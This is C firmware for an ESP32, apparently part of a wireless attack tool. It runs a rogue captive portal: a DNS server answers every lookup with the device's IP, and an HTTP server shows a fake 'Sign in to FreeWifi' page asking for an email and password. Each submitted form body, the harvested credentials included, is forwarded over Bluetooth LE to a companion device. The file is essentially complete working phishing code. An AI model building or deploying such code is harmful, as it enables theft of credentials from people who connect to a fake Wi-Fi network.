#include "captive_portal.h"
#include "tlv.h"
#include "transport_ble.h"

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include "esp_log.h"
#include "esp_err.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "lwip/err.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"

static const char *TAG = "captive";

#define DNS_PORT      53
#define HTTP_PORT     80
#define DNS_BUF_SIZE  512
#define HTTP_BUF_SIZE 1024
#define HTTP_BODY_TLV_MAX 130
#define DOMAIN_TLV_MAX  64
#define PATH_TLV_MAX   80

static const char *DEFAULT_HTML =
    "<!DOCTYPE html><html><head><meta charset=\"utf-8\">"
    "<meta name=\"viewport\" content=\"width=device-width\">"
    "<title>Sign in</title>"
    "<style>body{font:16px sans-serif;max-width:380px;margin:60px auto;padding:0 20px}"
    "input{width:100%;padding:10px;margin:6px 0;box-sizing:border-box;font-size:16px}"
    "button{width:100%;padding:12px;font-size:16px;background:#0a7;color:#fff;border:0}</style>"
    "</head><body>"
    "<h2>Sign in to FreeWifi</h2>"
    "<form method=\"POST\" action=\"/login\">"
    "<input name=\"username\" placeholder=\"Email\" autofocus>"
    "<input name=\"password\" placeholder=\"Password\" type=\"password\">"
    "<button>Sign in</button></form></body></html>";

static volatile bool s_active = false;
static volatile bool s_stop = false;
static TaskHandle_t s_dns_task = NULL;
static TaskHandle_t s_http_task = NULL;
static int s_dns_sock = -1;
static int s_http_sock = -1;
static char *s_html = NULL;
static size_t s_html_len = 0;
static uint8_t s_redirect_ip[4] = {192, 168, 4, 1};
static uint8_t s_seq = 0;

bool captive_portal_busy(void)
{
    return s_active;
}

esp_err_t captive_portal_init(void)
{
    ESP_LOGI(TAG, "ready");
    return ESP_OK;
}

// ----------------------------------------------------------------------
// Emissão de TLVs
// ----------------------------------------------------------------------

static void emit_dns_query(const uint8_t src_ip[4], const char *domain, size_t domain_len)
{
    if (domain_len > DOMAIN_TLV_MAX) domain_len = DOMAIN_TLV_MAX;
    uint8_t payload[5 + DOMAIN_TLV_MAX];
    memcpy(&payload[0], src_ip, 4);
    payload[4] = (uint8_t)domain_len;
    if (domain_len) memcpy(&payload[5], domain, domain_len);

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_PORTAL_DNS_QUERY, s_seq++,
                           payload, 5 + domain_len);
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

static void emit_http_req(const uint8_t src_ip[4],
                           const char *method, size_t method_len,
                           const char *path, size_t path_len,
                           const char *body, size_t body_len)
{
    if (method_len > 8) method_len = 8;
    if (path_len > PATH_TLV_MAX) path_len = PATH_TLV_MAX;
    if (body_len > HTTP_BODY_TLV_MAX) body_len = HTTP_BODY_TLV_MAX;

    uint8_t payload[4 + 1 + 8 + 1 + PATH_TLV_MAX + 2 + HTTP_BODY_TLV_MAX];
    size_t off = 0;
    memcpy(&payload[off], src_ip, 4); off += 4;
    payload[off++] = (uint8_t)method_len;
    memcpy(&payload[off], method, method_len); off += method_len;
    payload[off++] = (uint8_t)path_len;
    memcpy(&payload[off], path, path_len); off += path_len;
    payload[off++] = (uint8_t)(body_len >> 8);
    payload[off++] = (uint8_t)(body_len & 0xFF);
    if (body_len) { memcpy(&payload[off], body, body_len); off += body_len; }

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_PORTAL_HTTP_REQ, s_seq++,
                           payload, off);
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

// ----------------------------------------------------------------------
// DNS hijack task
// ----------------------------------------------------------------------

// Lê o nome da query DNS (formato com labels) e converte pra string
// "domain.tld". Retorna número de bytes consumidos no buffer (ou -1 erro).
static int parse_dns_name(const uint8_t *buf, int len, int start,
                           char *out, size_t out_cap, size_t *out_len)
{
    int p = start;
    size_t w = 0;
    while (p < len && buf[p] != 0) {
        uint8_t lab_len = buf[p++];
        if (lab_len & 0xC0) return -1; // pointer no nome inicial — ignora
        if (p + lab_len > len) return -1;
        if (w + lab_len + 1 > out_cap) return -1;
        if (w > 0) out[w++] = '.';
        memcpy(&out[w], &buf[p], lab_len);
        w += lab_len;
        p += lab_len;
    }
    if (p >= len) return -1;
    p++; // pula null terminator
    out[w] = 0;
    if (out_len) *out_len = w;
    return p - start;
}

static void dns_task(void *arg)
{
    (void)arg;

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        ESP_LOGE(TAG, "dns socket failed");
        goto out;
    }

    int yes = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));

    struct sockaddr_in srv = {
        .sin_family = AF_INET,
        .sin_port = htons(DNS_PORT),
        .sin_addr.s_addr = htonl(INADDR_ANY),
    };
    if (bind(sock, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
        ESP_LOGE(TAG, "dns bind failed errno=%d", errno);
        close(sock);
        goto out;
    }

    s_dns_sock = sock;
    ESP_LOGI(TAG, "dns hijack listening on :53");

    uint8_t buf[DNS_BUF_SIZE];
    while (!s_stop) {
        struct sockaddr_in cli;
        socklen_t cl = sizeof(cli);
        int n = recvfrom(sock, buf, sizeof(buf), 0,
                          (struct sockaddr *)&cli, &cl);
        if (n < 12) continue; // header DNS = 12 bytes mín

        // Parseia nome pra TLV (não interfere na resposta — só pra log)
        char domain[DOMAIN_TLV_MAX + 1] = {0};
        size_t domain_len = 0;
        parse_dns_name(buf, n, 12, domain, sizeof(domain), &domain_len);

        uint32_t cli_ip = ntohl(cli.sin_addr.s_addr);
        uint8_t src[4] = {
            (cli_ip >> 24) & 0xFF, (cli_ip >> 16) & 0xFF,
            (cli_ip >> 8) & 0xFF,  cli_ip & 0xFF,
        };
        emit_dns_query(src, domain, domain_len);

        // Constrói resposta: copia query, set QR=1, AA=1, ANCOUNT=1.
        buf[2] |= 0x84;         // byte 2: QR=1, AA=1 (pra parecer authoritative)
        buf[3] |= 0x80;         // byte 3: RA=1
        buf[6] = 0; buf[7] = 1; // ANCOUNT=1
        buf[8] = 0; buf[9] = 0; // NSCOUNT=0
        buf[10] = 0; buf[11] = 0; // ARCOUNT=0

        // Avança até o fim da question section
        int p = 12;
        while (p < n && buf[p] != 0) p += buf[p] + 1;
        p += 5; // null + qtype(2) + qclass(2)
        if (p + 16 > (int)sizeof(buf)) {
            // sem espaço pra answer — manda só header
            sendto(sock, buf, p, 0, (struct sockaddr *)&cli, cl);
            continue;
        }

        // Answer: ptr ao name(0xC00C) + TYPE A + CLASS IN + TTL 60 + RDLENGTH 4 + IP
        buf[p++] = 0xC0; buf[p++] = 0x0C;
        buf[p++] = 0;    buf[p++] = 0x01;     // TYPE A
        buf[p++] = 0;    buf[p++] = 0x01;     // CLASS IN
        buf[p++] = 0;    buf[p++] = 0;
        buf[p++] = 0;    buf[p++] = 60;       // TTL 60s
        buf[p++] = 0;    buf[p++] = 4;        // RDLENGTH 4
        buf[p++] = s_redirect_ip[0];
        buf[p++] = s_redirect_ip[1];
        buf[p++] = s_redirect_ip[2];
        buf[p++] = s_redirect_ip[3];

        sendto(sock, buf, p, 0, (struct sockaddr *)&cli, cl);
    }

    close(sock);
    s_dns_sock = -1;
out:
    s_dns_task = NULL;
    ESP_LOGI(TAG, "dns task ended");
    vTaskDelete(NULL);
}

// ----------------------------------------------------------------------
// HTTP server task
// ----------------------------------------------------------------------

static void http_handle_client(int cli, const struct sockaddr_in *cli_addr)
{
    char buf[HTTP_BUF_SIZE];
    int total = 0;

    // Lê o request (até cabeçalhos completos OU buffer cheio)
    while (total < (int)(sizeof(buf) - 1)) {
        int n = recv(cli, buf + total, sizeof(buf) - 1 - total, 0);
        if (n <= 0) break;
        total += n;
        buf[total] = 0;
        if (strstr(buf, "\r\n\r\n")) break;
    }
    if (total == 0) return;
    buf[total < (int)sizeof(buf) ? total : (int)sizeof(buf) - 1] = 0;

    // Parse first line: METHOD PATH HTTP/x.x
    char method[16] = {0};
    char path[256] = {0};
    sscanf(buf, "%15s %255s", method, path);

    // Body começa após \r\n\r\n
    char *body = strstr(buf, "\r\n\r\n");
    size_t body_len = 0;
    if (body) {
        body += 4;
        body_len = total - (body - buf);
    }
    // Lê mais body até HTTP_BODY_TLV_MAX (forms grandes não cabem no buffer
    // inicial). Se ainda há Content-Length > o que lemos, faz drenos extras.
    if (body && body_len < HTTP_BODY_TLV_MAX) {
        size_t want = HTTP_BODY_TLV_MAX - body_len;
        char extra[HTTP_BODY_TLV_MAX];
        struct timeval tv = {.tv_sec = 0, .tv_usec = 200 * 1000};
        setsockopt(cli, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        int got = recv(cli, extra, want, 0);
        if (got > 0) {
            // Junta no buffer principal se couber
            if (total + got < (int)sizeof(buf) - 1) {
                memcpy(buf + total, extra, got);
                total += got;
                body_len += got;
                buf[total] = 0;
            }
        }
    }

    uint32_t cli_ip = ntohl(cli_addr->sin_addr.s_addr);
    uint8_t src[4] = {
        (cli_ip >> 24) & 0xFF, (cli_ip >> 16) & 0xFF,
        (cli_ip >> 8) & 0xFF,  cli_ip & 0xFF,
    };
    emit_http_req(src, method, strlen(method), path, strlen(path),
                  body ? body : "", body_len);

    // Resposta: 200 + HTML configurável.
    // Para captive portal detection (iOS hotspot-detect, Android generate_204,
    // Windows connecttest) returning 200 com HTML diferente do esperado já
    // é o gatilho do popup. Não precisamos casos especiais aqui.
    char hdr[256];
    int hl = snprintf(hdr, sizeof(hdr),
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html; charset=utf-8\r\n"
        "Content-Length: %u\r\n"
        "Connection: close\r\n"
        "Cache-Control: no-store\r\n"
        "\r\n", (unsigned)s_html_len);
    if (hl > 0) send(cli, hdr, hl, 0);
    if (s_html_len) send(cli, s_html, s_html_len, 0);
}

static void http_task(void *arg)
{
    (void)arg;

    int srv = socket(AF_INET, SOCK_STREAM, 0);
    if (srv < 0) {
        ESP_LOGE(TAG, "http socket failed");
        goto out;
    }

    int yes = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(HTTP_PORT),
        .sin_addr.s_addr = htonl(INADDR_ANY),
    };
    if (bind(srv, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        ESP_LOGE(TAG, "http bind failed errno=%d", errno);
        close(srv);
        goto out;
    }
    if (listen(srv, 4) < 0) {
        ESP_LOGE(TAG, "http listen failed");
        close(srv);
        goto out;
    }

    s_http_sock = srv;
    ESP_LOGI(TAG, "http server listening on :80");

    while (!s_stop) {
        struct sockaddr_in cli;
        socklen_t cl = sizeof(cli);
        int c = accept(srv, (struct sockaddr *)&cli, &cl);
        if (c < 0) {
            if (s_stop) break;
            vTaskDelay(pdMS_TO_TICKS(20));
            continue;
        }
        // Timeout por leitura: 1s pra evitar slowloris.
        struct timeval tv = {.tv_sec = 1, .tv_usec = 0};
        setsockopt(c, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        http_handle_client(c, &cli);
        close(c);
    }

    close(srv);
    s_http_sock = -1;
out:
    s_http_task = NULL;
    ESP_LOGI(TAG, "http task ended");
    vTaskDelete(NULL);
}

// ----------------------------------------------------------------------
// API pública
// ----------------------------------------------------------------------

esp_err_t captive_portal_start(const char *html, const uint8_t redirect_ip[4])
{
    if (s_active) return ESP_ERR_INVALID_STATE;

    // Copia HTML pra buffer próprio (caller pode liberar)
    const char *src = (html && html[0]) ? html : DEFAULT_HTML;
    size_t len = strlen(src);
    if (len > 32 * 1024) len = 32 * 1024; // cap razoável
    s_html = malloc(len + 1);
    if (!s_html) return ESP_ERR_NO_MEM;
    memcpy(s_html, src, len);
    s_html[len] = 0;
    s_html_len = len;

    if (redirect_ip) {
        memcpy(s_redirect_ip, redirect_ip, 4);
    } else {
        s_redirect_ip[0] = 192; s_redirect_ip[1] = 168;
        s_redirect_ip[2] = 4;   s_redirect_ip[3] = 1;
    }

    s_stop = false;
    s_active = true;

    if (xTaskCreate(dns_task, "captive_dns", 4096, NULL, 5, &s_dns_task) != pdPASS) {
        s_active = false;
        free(s_html); s_html = NULL;
        return ESP_ERR_NO_MEM;
    }
    if (xTaskCreate(http_task, "captive_http", 6144, NULL, 5, &s_http_task) != pdPASS) {
        s_stop = true;
        s_active = false;
        free(s_html); s_html = NULL;
        return ESP_ERR_NO_MEM;
    }

    ESP_LOGI(TAG, "started: redirect=%u.%u.%u.%u html_len=%u",
             s_redirect_ip[0], s_redirect_ip[1],
             s_redirect_ip[2], s_redirect_ip[3], (unsigned)s_html_len);
    return ESP_OK;
}

esp_err_t captive_portal_stop(void)
{
    if (!s_active) return ESP_ERR_INVALID_STATE;
    s_stop = true;
    // Fecha sockets pra desbloquear recvfrom/accept.
    if (s_dns_sock >= 0)  shutdown(s_dns_sock, SHUT_RDWR);
    if (s_http_sock >= 0) shutdown(s_http_sock, SHUT_RDWR);

    // Pequeno yield pras tasks saírem dos loops e se auto-deletarem.
    for (int i = 0; i < 50 && (s_dns_task || s_http_task); i++) {
        vTaskDelay(pdMS_TO_TICKS(20));
    }

    free(s_html);
    s_html = NULL;
    s_html_len = 0;
    s_active = false;
    ESP_LOGI(TAG, "stopped");
    return ESP_OK;
}
